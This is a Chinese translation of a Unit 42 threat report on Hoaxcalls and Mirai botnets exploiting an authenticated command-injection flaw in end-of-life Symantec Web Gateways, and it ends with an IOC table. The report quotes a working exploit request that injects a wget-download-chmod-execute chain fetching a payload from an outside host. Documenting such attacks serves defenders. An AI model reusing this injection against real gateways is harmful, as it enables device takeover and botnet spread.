**原文：[Mirai and Hoaxcalls Botnets Target Legacy Symantec Web
Gateways](https://unit42.paloaltonetworks.com/hoaxcalls-mirai-target-legacy-symantec-web-gateways/ "Mirai and Hoaxcalls Botnets Target Legacy Symantec Web
Gateways")  
译者：知道创宇404实验室翻译组**

### 摘要

作为Unit
42主动监控野外传播威胁工作的一部分，我最近发现了新的Hoaxcalls和Mirai僵尸网络活动，是针对赛门铁克安全Web网关5.0.2.8中的身份验证后的远程执行代码漏洞。该产品已逐渐淘汰，于2015年到期，产品支持于2019年到期。目前还没证据表明其他版本的固件易受攻击，我已与赛门铁克共享这些发现。他们证实赛门铁克Web网关5.2.8中已不再存在当前被利用的漏洞，他们还想强调一点，此漏洞不会影响安全的Web网关解决方案，包括代理程序和Web安全服务。

2020年4月24日，第一个利用该漏洞的攻击实例浮出水面，这是同月早些时候首次发现的僵尸网络演化的一部分。这个最新版本的Hoaxcalls支持其它命令，这些命令允许攻击者对受感染的设备进行更大的控制，比如代理通信、下载更新、保持跨设备重启的持久性或防止重启，以及可以发起更多的DDoS攻击。在漏洞细节公布的几天后，就开始在野外使用该漏洞利用程序，这说明了一个事实，这个僵尸网络的作者一直在积极测试新漏洞的有效性。

此后，在5月的第一周，我还发现了一个Mirai变体活动，其中涉及使用相同的漏洞利用，尽管在该活动中，样本本身不包含任何DDoS功能。相反，它们的目的是使用证书暴力进行传播以及利用赛门铁克Web网关RCE漏洞。本文讲述有关这两个活动值得注意的技术细节。

### Hoaxcalls进化

Hoaxcalls僵尸网络是Bashlite/Gafgyt恶意软件家族的一个分支，首次发现是在2020年4月，它利用了最近披露的某些Grandstream商务电话IP
PBX系统模型和Draytek Vigor路由器中的漏洞。

几周后，发现该僵尸网络利用了一个未修补的漏洞，该漏洞影响了Zyxel Cloud CNM SecuManager。

4月24日，我观察到同一僵尸网络的样本，该僵尸网络包含针对EOL的赛门铁克安全Web网关5.0.2.8版本的利用，并带有以下格式的HTTP请求：

    
    
    POST /spywall/timeConfig.php HTTP/1.1
    
    User-Agent: XTC
    
    posttime=1585228657&saveForm=Save&timesync=1&ntpserver=http://qweqwe.com;$(wget%20http://plexle.us/Th5xrRAm%20-O%20/tmp/viktor%20&&%20chmod%20777%20/tmp/viktor%20&&%20/tmp/viktor);#&timezone=5

如上面代码所示，一些样本访问了一个公共文件上传服务(plexle[.]us)的URL，其中托管了开发后的payload。

这篇文章的末尾可以找到完整的IOCs和攻击活动时间表。

虽然Hoaxcalls僵尸网络的新版本非常类似于最初的版本，以至于它甚至使用相同的加密方案相同的密钥，它还支持其他命令，使攻击者可以更有效地控制受感染的设备，例如通过它们代理流量、下载更新、在设备重启时保持持久性或者防止重启，以及可以发起的更多DDoS攻击。下面详细说明。

![
](https://images.seebug.org/content/images/2020/05/0ef590bf-a0ec-420d-9b81-fb2ba0bcb49b.png-w331s)
表1 新的Flooder命令

与更新联系的URL提供了一个Shell脚本，该脚本从攻击者控制的URL下载并执行二进制文件。

![
](https://images.seebug.org/content/images/2020/05/9bc81044-a242-436a-a9e4-3cd3d0d118fd.png-w331s)
图1 Hoaxcalls更新URL

其他bot和Flooder命令与之前版本的Hoaxcalls僵尸网络有共同之处，在[前面](https://unit42.paloaltonetworks.com/new-hoaxcalls-ddos-botnet/ "前面")已经详细描述过。

### Mirai 变种

该活动的样本于5月初浮出水面，构建于Mirai源代码之上，并通过UPX算法使用不同的4字节密钥打包了UPX的修改版本。

Mirai源代码的另一个不同之处是使用了全部10个8字节密钥，这些密钥累积起来用于按字节方式的字符串加密方案。

    
    
         0xDEADBEEF, 0x85DAB8BF, 0xDEEDEEBF, 0xDEABBEAF, 0xDBBD45BF, 0x246584EF, 0x85BFE8BF, 0xD68395BF, 0xDBAAAAAF, 0x0DAABEEF

这类似于Hoaxcalls僵尸网络所使用的方案，在以前的变种中也见过。然而，从先前的实现中也可以很明显地看出，使用多个密钥并不意味着更大的加密复杂性，在本例中，这实际上相当于使用0x5a的按字节XOR加密。

在本次活动中，样本本身不包含任何DDoS功能，而是使用凭据暴力破解并且利用赛门铁克安全Web网关RCE漏洞进行传播。

#### 关于成功开发的猜测

值得一提的是，僵尸网络的成功利用和感染受到以下两个条件的限制：

  1. 被利用的赛门铁克安全Web网关RCE漏洞是一个身份验证后的漏洞，意味着该漏洞仅对经过认证的会话有效。
  2. 目标设备是2012年的EOLD产品，安装了新固件的设备不会受到攻击。

### 结论

在这两种攻击中，可以假定它们成功利用此漏洞是受到赛门铁克安全Web网关RCE漏洞的身份验证特性的限制。

Palo Alto Networks的客户受到WildFire的保护，可检测所有带有恶意判断的相关样本，并阻止该变种使用的所有攻击。

Palo Alto Networks在本报告中与我们的网络威胁联盟其他成员共享了我们的发现，包括文件样本和IoCs。
CTA成员使用此情报可快速向其客户部署保护，并系统地破坏恶意网络攻击者。

### IoCs

**First Seen** | **SHA256** | **URL**  
---|---|---  
2020-05-07 | 1cec4576595048a179bf8c21b58f33ef61ae1825b2b3f0a86915a741a04f253f
| 45[.]95.168.250/swrgiuhguhwrguiwetu/arm  
2020-05-07 | a31187ed8545789ff2979037e19e1ca18d35a75820a1ec91053782f30c47ecc5
| 45[.]95.168.250/swrgiuhguhwrguiwetu/arm5  
2020-05-07 | ef5d39a3fa641b4d55d870437a9ba774eefcfa2c69066dd0a6fbe513a4b7a8f2
| 45[.]95.168.250/swrgiuhguhwrguiwetu/arm6  
2020-05-07 | 04e8356bdc8782cf03acc9f69ff6fa9dfde7378dcd1fe0dc737d13fd4d7e061e
| 45[.]95.168.250/swrgiuhguhwrguiwetu/arm7  
2020-05-07 | 60f755288c9d3110d2fe5d872b2c045156dcea4be9a5cc918bddf1e786881842
| 45[.]95.168.250/swrgiuhguhwrguiwetu/m68k  
2020-05-07 | 0e531e105aa3419cd19e95fa9d44f6176157002a09444a1e5465657d743180ac
| 45[.]95.168.250/swrgiuhguhwrguiwetu/mips  
2020-05-07 | 02dc186a39607475838bb4859f89e7a200f74fed41400ab5db4eb42d3f58f772
| 45[.]95.168.250/swrgiuhguhwrguiwetu/mpsl  
2020-05-07 | 72675ccf2d4e0d0aac2f5121a6a80ea1efc4f30b22e64b07bd891438de2bf82a
| 45[.]95.168.250/swrgiuhguhwrguiwetu/ppc  
2020-05-07 | 0a48cc158a07e13bd76ac941c4523692530f836d69256b02a10052248263d781
| 45[.]95.168.250/swrgiuhguhwrguiwetu/sh4  
2020-05-07 | 37dfde696632295e806924de3d3ab751404e2a968e063a12ce72eb2e3ce0b984
| 45[.]95.168.250/swrgiuhguhwrguiwetu/x86  
2020-05-02 | da84fd43cb8701c4e23dd0a4175ebccebda026ca2f47b7b1bad393205075389f
| 164[.]132.92.180/arm4  
2020-05-02 | 287645a5a29a39ef94aa0cdebdbd3cb4ad2a45ead8894fc323a5a2a76a7fdb0d
| 164[.]132.92.180/arm5  
2020-05-02 | 4a4316178e85e0d4c94d74af9f2258c045194cf7a4f4a83a90abf5db09fbaa04
| 164[.]132.92.180/i586  
2020-05-02 | 38290965b2cd8048b3ef076487b99dfbeef457f6f6f9998b95ff922e160a5113
| 164[.]132.92.180/i486  
2020-05-02 | 25d1c51135dca20f4f7a720f237d9186edde2a2a664ede6bef37e843e7be409c
| 164[.]132.92.180/i686  
2020-05-02 | 012d49c6e847f2f75983b46a9a1310dac29b5f8d30b665ae2124d8619b80753b
| 164[.]132.92.180/m68k  
2020-05-02 | 763dfa5f391d27e65be6682c2e58c888df309fa2732781db312f5c9b10e6d5a1
| 164[.]132.92.180/mips  
2020-05-02 | ad1156e6ad91b02f225d82d96000cf9abf671a305e8c5c61229d69dbed5050ba
| 164[.]132.92.180/mips64  
2020-05-02 | 28f31eb4b1fd3b7e742f5043a26b383585317d16bbfdae0296e18b90dcbec29b
| 164[.]132.92.180/ppc440  
2020-05-02 | 5d8756118b7e017eb4f4c5da4236191b20a5c8cb96abb76c26f0e918a76bd973
| 164[.]132.92.180/mpsl  
2020-05-02 | 1f64287ae9ea968017b3615f2b5b51932d7eeb3f0ee6621f74ae29af8f1a27d5
| 164[.]132.92.180/sh4  
2020-05-02 | 65a8ea32f77c2d18325d49d0cc32a4bbf893a2f106e77e8a8670191c71b456a9
| 164[.]132.92.180/spc  
2020-05-02 | 2b0854d40d8ffdca886f4540156b7addc4245de5df197e39ce198b9cf098944a
| 164[.]132.92.180/arm6  
2020-05-02 | 43ce5e4fb95b57fa2921d718e989107a594d5287b5bbbcb3e9bff262a982e815
| 164[.]132.92.180/ppc  
2020-05-02 | 3d6be7b9bd4798000230e354a5777601ca6672c8d84af842469ddeb1681ed7f2
| 164[.]132.92.180/arm7  
2020-05-02 | e0141934100df75d6b0c61858fc4cc44f97ce2a2588aa5d042f965f9542b843b
| 164[.]132.92.180/x86  
2020-05-01 | 85f397e052950f736b32f0463dce7a1458ed034bec57284ea83d2ee4788f8a82
| 164[.]132.92.180/x86  
2020-05-01 | b39763036951bb373e1389362c4de6c4cbd3af3757dbb66d53fceb69de02677f
| 164[.]132.92.180/arm7  
2020-05-01 | 6d76fd0bb5ba2d1c19f64288bb4b20eb136171aa8ea1afb685d2e363911aab2f
| 164[.]132.92.180/arm6  
2020-05-01 | 5415ce3e759bcc3a8a163a84b64a7185f6540d4ec0ff07627ac770fd0ef0244d
| 164[.]132.92.180/arm5  
2020-05-01 | b52f8ff49e172a3e41ec60010c4089e3534ad1f0582a7ee04c4aa58c34db21ca
| 164[.]132.92.180/arm4  
2020-05-01 | e248445c39cac693fc2a921e41879fb80286f418c352d7a9d428d6181fe113a3
| 164[.]132.92.180/mpsl  
2020-05-01 | a3e2d3536d3facd3d825949addd7e99152b5df395b26e41e04b16be0a8cf4d85
| 164[.]132.92.180/mips  
2020-04-27 | 82e5e0f6c130a3f0424cf33468f5ec7a3a66d14f5d346196d1b604ecd2b1e6a3
| 164[.]132.92.180/x86  
2020-04-27 | fa1bc69c9eccaaa4b8131856f9e69837f10dfa1236a65e0a8954d297c2a465bd
| 164[.]132.92.180/arm4  
2020-04-26 | 233d4f6ee9f0ffb52b88de0218a0a4b04e3b20c5440e6414255d644ef696d190
|  
2020-04-24 | 81e9a4b8f8a7d06d871488d9c869bde54a83ff7fe33d652ed58c10109b9830ee
| plexle[.]us/Th5xrRAm  
2020-04-24 | e15eeeaeb0ac0639bf3491ba8801e30516e085047f2d787397966065bdf9d5e7
|  
2020-04-24 | 5916171938fba2d218de38c8b1f484345bc62d436b7b501ef986ae06c133b13d
|  
2020-04-24 | 970496ac754ce7573216950a9904bdfc75574b4c0605e1d62364be799b9c813b
|  
2020-04-24 | 735beaa92e7d697a521c7ed5292b3e8100c29a2af88f1a1b99abf0a1bc5ab5c8
| 164[.]132.92.180/i686  
2020-04-24 | 84e017a59f9f7d7d5fde40bc2867a1e9d6ec6fae63b3e21685b3bb7166357531
| 164[.]132.92.180/arm7  
2020-04-24 | 81e9a4b8f8a7d06d871488d9c869bde54a83ff7fe33d652ed58c10109b9830ee
|  
2020-04-24 | 9ce642628cec8de80d2186d5d7f020635180326ed9e33cabde46d6c9b2caba1b
|  
2020-04-24 | 20c3f1bbf4ae4733c6e01eb4f82a251bcb5b0ae0bd5f1b1a028b7ff65ea779af
|  
2020-04-24 | ddab987e986f76fcc36af92a6ea15439dd36253d91c0c3cddd77b2b9fd9ff395
|  
2020-04-24 | 7bca6fcc70d14253803780e80ee57b29814adeae1af993374f919a1017f5b0f5
|  
  
* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1211/>

